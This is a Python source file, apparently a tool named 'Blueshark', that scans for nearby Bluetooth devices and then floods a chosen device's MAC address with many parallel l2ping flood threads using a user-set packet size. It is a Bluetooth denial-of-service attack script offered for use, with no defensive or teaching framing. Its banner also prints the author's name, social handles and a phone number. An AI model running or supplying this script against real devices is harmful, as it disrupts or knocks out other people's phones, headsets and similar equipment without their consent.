import os
import threading
import time
import requests

from operator import contains


class ScanforDevices:

    def scan():
        scan_time = 5
        devices = {}
        os.system('hcitool scan > scan.txt')
        
        with open('scan.txt', 'r') as f:
            for line in f:
                if line.startswith('Scan'):
                    continue
                else:
                    line = line.split(' ')
                    devices[line[0]] = line[1]

        for mac, name in devices.items():
            print(mac, name)


class Banner:

    def clear_screen():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')

    def banner():
        r = requests.get('https://raw.githubusercontent.com/deidal0s/Blueshark/main/ascii.txt')
        print(r.text)
        print('''
            Author:       
                          Prepakis George
            Contact:
                        github.com/deidal0s
                       www.instagram.com/brdu
                          +49 163 8185343
            ''')



class SendAttack:

    def send_attack(device_mac, packet_size):
        command = f'l2ping -i hci0 -f {device_mac} -s {str(packet_size)}'
        if os.name == 'nt':
            os.system(f'{command} > NUL')
        else:
            os.system(command + ' > /dev/null')


class Interface:

    def main():
        device_mac = input('blueshark(device-mac)> ')
        packet_size = int(input('blueshark(packet-size)> '))
        threads = int(input('blueshark(threads)> '))

        print('\n[ DEBUG ] Threads built successfully')
        print(f'[ DEBUG ] Attacking Device Mac: {device_mac}...')

        if len(device_mac) < 1:
            print('[ DEBUG ] Device Mac is missing')
            exit()
        time.sleep(3)

        for i in range(0, threads):
            threading.Thread(target=SendAttack.send_attack, args=[str(device_mac), str(packet_size)]).start()


class StartScript:

    def start():
        Banner.clear_screen()
        Banner.banner()
        Interface.main()


StartScript.start()



